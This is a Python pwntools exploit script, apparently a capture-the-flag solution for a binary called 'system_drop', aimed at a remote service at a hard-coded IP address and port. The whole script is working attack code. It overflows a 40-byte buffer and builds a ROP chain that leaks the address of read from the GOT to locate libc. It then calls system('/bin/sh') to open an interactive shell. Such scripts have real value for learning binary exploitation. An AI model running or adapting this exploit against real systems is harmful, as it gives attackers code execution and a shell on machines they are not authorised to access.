from pwn import *

exe = './system_drop'
context.binary = exe

# p = process(exe)
# libc = ELF('./libc.self')

p = remote('138.68.142.141', 32118)
libc = ELF('./libc.target')

TIMEOUT = 1

elf = ELF(exe)

POP_RDI = 0x00000000004005d3
POP_RSI_R15 = 0x00000000004005d1


READ_SETUP_CALL_ADDRESS = 0x00400553
SYSCALL = 0x0040053b

#offset 40
junk = 'A' * 40
junk = junk.encode('latin-1')

def leak_memory(address):
    payload = junk
    payload += p64(POP_RDI)
    payload += p64(1)
    payload += p64(POP_RSI_R15)
    payload += p64(elf.got['read'])
    payload += p64(0)
    payload += p64(SYSCALL)
    payload += p64(elf.sym['main'])
    p.send(payload)
    leak = p.recv(timeout=TIMEOUT)
    return leak

leak = leak_memory(elf.got['read'])
GOT_READ = int.from_bytes(leak[:8], 'little')
log.info(f"GOT_READ = {hex(GOT_READ)}")
libc.address = GOT_READ - libc.sym['read']
log.info(f"Libc @ {hex(libc.address)}")

BIN_SH = next(libc.search(b'/bin/sh\x00'))

payload = junk
payload += p64(POP_RDI)
payload += p64(BIN_SH)
payload += p64(libc.sym['system'])
payload += p64(elf.sym['main'])

p.sendline(payload)

p.interactive()